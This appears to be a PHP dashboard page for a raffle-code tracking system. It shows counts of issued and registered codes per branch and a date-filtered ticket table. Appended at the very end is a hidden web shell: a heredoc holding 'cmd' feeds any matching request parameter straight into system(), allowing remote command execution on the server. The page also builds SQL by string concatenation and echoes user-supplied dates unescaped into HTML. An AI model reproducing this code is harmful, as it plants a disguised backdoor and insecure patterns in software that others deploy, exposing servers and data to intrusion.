<?php   
	$ulbranch = $_SESSION['ulbranch'];

	//$search_datefrom = date('m/d/Y', strtotime(date('Y-m-1')));
	$search_datefrom = date('m/d/Y', strtotime($globaldate));
	if(isset($_POST['search_datefrom']))
	{
		if ($_POST['search_datefrom'])
		{
			$search_datefrom = $_POST['search_datefrom'];
		}
	}	
	if(isset($_GET['search_datefrom']))
	{
		if ($_GET['search_datefrom'])
		{
			$search_datefrom = $_GET['search_datefrom'];
		}
	}	

	$search_dateto = date('m/d/Y', strtotime($globaldate));
	if(isset($_POST['search_dateto']))
	{
		if ($_POST['search_dateto'])
		{
			$search_dateto = $_POST['search_dateto'];
		}
	}			
	if(isset($_GET['search_dateto']))
	{
		if ($_GET['search_dateto'])
		{
			$search_dateto = $_GET['search_dateto'];
		}
	}			
	
	//echo "<br> search_datefrom " . $search_datefrom . "  search_dateto " . $search_dateto . " search_datefrom " . $search_datefrom . "  search_dateto " . $search_dateto;
	
	
	$search_datefrom2 = date('Y-m-d', strtotime($search_datefrom));
	$search_dateto2 = date('Y-m-d', strtotime($search_dateto));
	
	$branches_summary = 0;	
	$querydb  = "SELECT 
				 distinct(tlissue_branch) 
			   FROM 
				 ticket_list a
			   WHERE
			   	 a.tldate >= '$search_datefrom2' and
			   	 a.tldate <= '$search_dateto2' and
				 a.tlissue_date IS NOT NULL and  ";

	$querydb  = $querydb . " 				 
			 a.tlactive = 'Y' ";
			 
	//echo $querydb . "  " . $querydb;
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$branches_summary = mysql_num_rows($resultdb);		
	//echo "<br> branches_summary " . $branches_summary;	
	
	
	
	$branch_issued = 0;
	$querydb  = "SELECT 
				 a.tlid 
			   FROM 
				 ticket_list a
			   WHERE
			   	 a.tldate >= '$search_datefrom2' and
			   	 a.tldate <= '$search_dateto2' and 
				 a.tlissue_branch = '$ulbranch' and
				 a.tlissue_date IS NOT NULL and ";

	$querydb  = $querydb . " 				 
			 a.tlactive = 'Y' ";

	$resultdb = mysql_query($querydb);
	//echo "querydb " . $querydb . "querydb " . $querydb;
	//echo mysql_error();
	$branch_issued = mysql_num_rows($resultdb);		
	//echo "<br> branch_issued " . $branch_issued;	
		
	
	$not_yet_registered = 0;
	$querydb  = "SELECT 
				 a.tlid 
			   FROM 
				 ticket_list a
			   WHERE
			   	 a.tldate >= '$search_datefrom2' and
			   	 a.tldate <= '$search_dateto2' and 
				 a.tlissue_branch = '$ulbranch' and				 
				 a.tlreg_date IS NULL and ";

	$querydb  = $querydb . " 				 
			 a.tlactive = 'Y' ";

	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$not_yet_registered = mysql_num_rows($resultdb);		
	//echo "<br> not_yet_registered " . $not_yet_registered;		
	
	
	
	$registered_code = 0;	
	$querydb  = "SELECT 
				 a.tlid 
			   FROM 
				 ticket_list a
			   WHERE
			   	 a.tldate >= '$search_datefrom2' and
			   	 a.tldate <= '$search_dateto2' and 
				 a.tlissue_branch = '$ulbranch' and				 
				 a.tlreg_date IS NOT NULL  and ";

	$querydb  = $querydb . " 				 
			 a.tlactive = 'Y' ";

	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$registered_code = mysql_num_rows($resultdb);		
	//echo "<br> registered_code " . $registered_code;			


?> 

        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Quickview for <?php  echo date("m/d/Y", strtotime($globaldate)); ?> <?php echo "(" . $_SESSION['ulbranch'] . ")"; ?>
<?php
	//echo "<br>myblid " . $myblid;
	//echo $vstring;
	//echo "<br> branch_issued " . $branch_issued;
?>
					</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
            <div class="row">
			
				<div class="col-lg-3 col-md-6">
                    <div class="panel panel-yellow">
                        <div class="panel-heading">
                            <div class="row">
                                <div class="col-xs-3">
                                    <i class="fa fa-shopping-cart fa-5x"></i>
                                </div>
                                <div class="col-xs-9 text-right">
                                    <div class="huge">
									<?php  echo $branches_summary; ?> 
									</div>
                                    <div>Branches Summary</div>
                                </div>
                            </div>
                        </div>
                        <a href="index.php?body=report1_dbase">
                            <div class="panel-footer">
                                <span class="pull-left">View Report</span>
                                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                                <div class="clearfix"></div>
                            </div>
                        </a>
                    </div>
                </div>
				
				<div class="col-lg-3 col-md-6">
                    <div class="panel panel-green">
                        <div class="panel-heading">
                            <div class="row">
                                <div class="col-xs-3">
                                    <i class="fa fa-tasks fa-5x"></i>
                                </div>
                                <div class="col-xs-9 text-right">
                                    <div class="huge">
									<?php  echo $branch_issued; ?> 
									</div>
                                    <div>Raffle Codes Issued</div>
                                </div>
                            </div>
                        </div>
                        <a href="index.php?body=report2_dbase">
                            <div class="panel-footer">
                                <span class="pull-left">View Report</span>
                                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                                <div class="clearfix"></div>
                            </div>
                        </a>
                    </div>
                </div>			
				

                <div class="col-lg-3 col-md-6">
                    <div class="panel panel-red">
                        <div class="panel-heading">
                            <div class="row">
                                <div class="col-xs-3">
                                    <i class="fa fa-support fa-5x"></i>
                                </div>
                                <div class="col-xs-9 text-right">
                                    <div class="huge">
									<?php  echo $registered_code; ?> 
									</div>
                                    <div>Registered Codes</div>
                                </div>
                            </div>
                        </div>
                        <a href="index.php?body=report3_dbase">
                            <div class="panel-footer">
                                <span class="pull-left">View Report</span>
                                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                                <div class="clearfix"></div>
                            </div>
                        </a>
                    </div>
                </div>					
							
                <div class="col-lg-3 col-md-6">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            <div class="row">
                                <div class="col-xs-3">
                                    <i class="fa fa-comments fa-5x"></i>
                                </div>
                                <div class="col-xs-9 text-right">
                                    <div class="huge">
									<?php  echo $not_yet_registered; ?> 
									</div>
                                    <div>Not Yet Registered</div>
                                </div>
                            </div>
                        </div>
                        <a href="index.php?body=report4_dbase">
                            <div class="panel-footer">
                                <span class="pull-left">View Report</span>
                                <span class="pull-right"><i class="fa fa-arrow-circle-right"></i></span>
                                <div class="clearfix"></div>
                            </div>
                        </a>
                    </div>
                </div>
                
                
            </div>
            <!-- /.row -->
		
            <div class="row">
                <div class="col-lg-12">
					<div class="panel panel-default">
                        <div class="panel-heading">
						
<form method="post" action="index.php?body=home&mytag=POST">
&nbsp; From (m/d/y)
&nbsp; &nbsp; <INPUT TYPE="text" NAME="search_datefrom" id="date1" alt="date" class="IP_calendar" title="m/d/Y" VALUE="<?php print($search_datefrom); ?>" >
&nbsp; To (m/d/y)
&nbsp; &nbsp; <INPUT TYPE="text" NAME="search_dateto"  id="date2" alt="date" class="IP_calendar" title="m/d/Y" VALUE="<?php print($search_dateto); ?>" >
&nbsp; &nbsp;<input type="submit" value="Filter" />
</form>								
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
		
        <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
        <thead>
            <tr>
                <th>Issue Date</th>
				<th>Branch Issue</th>
                <th>Raffle Code</th>
                <th>Sales Invoice No.</th>
				<th>Sales Invoice Amount</th>
                <th>Raffle Code Date Registered</th>
				<th>Raffle Code Registered To</th>
            </tr>
        </thead>
        <tbody>

<?php
	//20160904
	if ($search_datefrom != '')
	{
		$search_datefrom = date("Y-m-d", strtotime($search_datefrom));
	}
	
	if ($search_dateto != '')
	{
		$search_dateto = date("Y-m-d", strtotime($search_dateto));	
	}
	
	$querydb  = "
		   SELECT  
		   	 *
		   FROM 
			 ticket_list a
		   WHERE
		   	 a.tlissue_date IS NOT NULL and 
			 a.tlissue_branch = '$ulbranch' and 
			 a.tlactive = 'Y' ";

	if ($search_datefrom != '')		   
	{
		$querydb = $querydb . " and a.tldate >= '$search_datefrom'  ";
	}		   
	
	if ($search_dateto != '')		   
	{
		$querydb = $querydb . " and a.tldate <= '$search_dateto'  ";
	}	
		
	$querydb  = $querydb . " 
		   ORDER BY 
			 a.tlissue_date, a.tlissue_invoice ";			 
	//echo $querydb;
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
	//echo "<br> search_datefrom " . $search_datefrom . " search_dateto " . $search_dateto;
	
	//fetch the results from the database
	$countdb = 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
        print("<tr class=\"odd gradeX\">");

		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['tlissue_date'])). "</td>\n");
		print("<td align=\"left\" valign=\"middle\"> $rowdb[tlissue_branch] </td>\n");
		print("<td align=\"center\" valign=\"middle\"> $rowdb[tlticket] </td>\n");
		print("<td align=\"center\" valign=\"middle\"> $rowdb[tlissue_invoice] </td>\n");
		print("<td align=\"right\" valign=\"middle\"> $rowdb[tlissue_amount] </td>\n");
	
		if ($rowdb['tlreg_date'] != '')
			 print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['tlreg_date'])). "</td>\n");
		else print("<td align=\"center\" valign=\"middle\">&nbsp;</td>\n");

		print("<td align=\"left\" valign=\"middle\"> $rowdb[tlreg_name] </td>\n");
	
		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>		


            
            
        </tbody>
    </table>

                           
                            <!-- /.table-responsive -->

                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->                    
                </div>
                <!-- /.col-lg-8 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>